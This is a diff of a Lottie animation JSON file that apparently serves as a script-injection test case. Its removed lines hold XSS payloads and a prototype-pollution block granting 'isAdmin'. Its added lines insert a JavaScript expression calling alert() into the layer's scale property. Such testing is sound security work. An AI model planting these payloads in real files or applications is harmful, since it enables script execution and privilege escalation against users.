@@ -1,86 +1,42 @@
 {
-  "v": "5.7.4",
-  "fr": 30,
+  "v": "5.5.2",
+  "fr": 60,
   "ip": 0,
-  "op": 60,
+  "op": 180,
   "w": 512,
   "h": 512,
-  "nm": "<svg/onload=alert('meta')>",
+  "nm": "Injected Animation",
   "ddd": 0,
-
-  "meta": {
-    "author": "<img src=x onerror=alert('author')>",
-    "description": "\"><svg/onload=alert('desc')>"
-  },
-
-  "__proto__": {
-    "role": "user",
-    "isAdmin": true
-  },
-
   "assets": [
     {
-      "id": "image_0",
-      "w": 100,
-      "h": 100,
-      "u": "data:image/svg+xml,",
-      "p": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(\"svg\")'></svg>",
-      "e": 1
+      "id": "image_1",
+      "w": 512,
+      "h": 512,
+      "u": "",
+      "p": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMjIyIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtc2l6ZT0iNDBweCIgZmlsbD0iI2ZmZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiPkhlbGxvIEJ1ZGR5PC90ZXh0Pjwvc3ZnPg=="
     }
   ],
-
   "layers": [
     {
       "ddd": 0,
       "ind": 1,
-      "ty": 5,
-      "nm": "<img src=x onerror=alert('layer')>",
+      "ty": 2,
+      "nm": "Injected Image Layer",
+      "refId": "image_1",
       "sr": 1,
       "ks": {
-        "o": {
-          "a": 0,
-          "k": 100
-        },
-        "r": {
-          "a": 0,
-          "k": 0
-        },
-        "p": {
-          "a": 0,
-          "k": [256, 256, 0]
-        },
-        "a": {
-          "a": 0,
-          "k": [0, 0, 0]
-        },
+        "o": { "a": 0, "k": 100 },
+        "r": { "a": 0, "k": 0 },
+        "p": { "a": 0, "k": [256, 256, 0] },
+        "a": { "a": 0, "k": [256, 256, 0] },
         "s": {
           "a": 0,
-          "k": [100, 100, 100]
+          "k": [100, 100, 100],
+          "x": "alert('hello there, im your buddy'); var $bm_rt = [100,100]; $bm_rt;"
         }
       },
-
-      "t": {
-        "d": {
-          "k": [
-            {
-              "s": {
-                "s": 32,
-                "f": "Arial",
-                "t": "<svg/onload=alert('text')>",
-                "j": 0,
-                "tr": 0,
-                "lh": 38,
-                "ls": 0,
-                "fc": [1, 0, 0]
-              },
-              "t": 0
-            }
-          ]
-        }
-      },
-
       "ip": 0,
-      "op": 60,
+      "op": 180,
       "st": 0,
       "bm": 0
     }
